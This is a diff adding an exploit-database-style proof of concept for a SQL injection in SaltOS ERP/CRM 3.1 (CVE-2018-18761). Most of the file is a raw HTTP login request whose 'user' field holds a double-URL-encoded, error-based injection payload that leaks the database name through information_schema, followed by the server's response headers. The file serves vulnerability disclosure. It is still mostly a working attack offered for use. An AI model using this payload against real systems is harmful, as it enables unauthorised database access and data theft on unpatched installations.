@@ -1,0 +1,50 @@
+# Exploit Title: SaltOS Erp, Crm 3.1 r8126 - SQL Injection
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.saltos.org/
+# Software Link: http://download.saltos.org/?app=saltos&format=xul&arch=win32
+# Version: 3.1 r0 / 3.x
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18761
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php
+# 
+POST /index.php HTTP/1.1
+Host: http://localhost/[PATH]:57187
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: */*
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost/[PATH]:57187/index.php
+Content-Length: 1318
+Cookie: PHPSESSID=3lqcs1bhqitg8ufb7v9kot7c71; lang=en_US; __lang__=1543313377; style=blue; __style__=1543313377; iconset=silk; __iconset__=1543313377
+DNT: 1
+Connection: keep-alive
+action=login&querystring=&user=%2531%2527%2561%256e%2564%2520%2528%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%2528%2573%2565%256c%2565%2563%2574%2520%2563%256f%2575%256e%2574%2528%252a%2529%252c%2563%256f%256e%2563%2561%2574%2528%2528%2573%2565%256c%2565%2563%2574%2528%2573%2565%256c%2565%2563%2574%2520%2563%256f%256e%2563%2561%2574%2528%2563%2561%2573%2574%2528%2564%2561%2574%2561%2562%2561%2573%2565%2528%2529%2520%2561%2573%2520%2563%2568%2561%2572%2529%252c%2530%2578%2537%2565%2529%2529%2520%2566%2572%256f%256d%2520%2569%256e%2566%256f%2572%256d%2561%2574%2569%256f%256e%255f%2573%2563%2568%2565%256d%2561%252e%2574%2561%2562%256c%2565%2573%2520%2577%2568%2565%2572%2565%2520%2574%2561%2562%256c%2565%255f%2573%2563%2568%2565%256d%2561%253d%2564%2561%2574%2561%2562%2561%2573%2565%2528%2529%2520%256c%2569%256d%2569%2574%2520%2530%252c%2531%2529%252c%2566%256c%256f%256f%2572%2528%2572%2561%256e%2564%2528%2530%2529%252a%2532%2529%2529%2578%2520%2566%2572%256f%256d%2520%2569%256e%2566%256f%2572%256d%2561%2574%2569%256f%256e%255f%2573%2563%2568%2565%256d%2561%252e%2574%2561%2562%256c%2565%2573%2520%2567%2572%256f%2575%2570%2520%2562%2579%2520%2578%2529%2561%2529%2520%2541%254e%2544%2520%2527%2545%2566%2565%2527%253d%2527%2545%2566%2565&pass=x&lang=en_US&style=blue&iconset=silk
+HTTP/1.1 200 OK
+Host: localhost/[PATH]:57187
+Connection: close
+X-Powered-By: PHP/5.4.15
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: PHPSESSID=3lqcs1bhqitg8ufb7v9kot7c71; path=\
+Set-Cookie: user=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=\
+Set-Cookie: __user__=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=\
+Set-Cookie: pass=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=\
+Set-Cookie: __pass__=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=\
+Set-Cookie: remember=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=\
+Set-Cookie: __remember__=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=\
+Set-Cookie: lang=en_US; expires=Tue, 27-Nov-2018 10:10:06 GMT; path=\
+Set-Cookie: __lang__=1543313406; expires=Tue, 27-Nov-2018 10:10:06 GMT; path=\
+Set-Cookie: style=blue; expires=Tue, 27-Nov-2018 10:10:06 GMT; path=\
+Set-Cookie: __style__=1543313406; expires=Tue, 27-Nov-2018 10:10:06 GMT; path=\
+Set-Cookie: iconset=silk; expires=Tue, 27-Nov-2018 10:10:06 GMT; path=\
+Set-Cookie: __iconset__=1543313406; expires=Tue, 27-Nov-2018 10:10:06 GMT; path=\
+Content-Type: text/html;charset=UTF-8
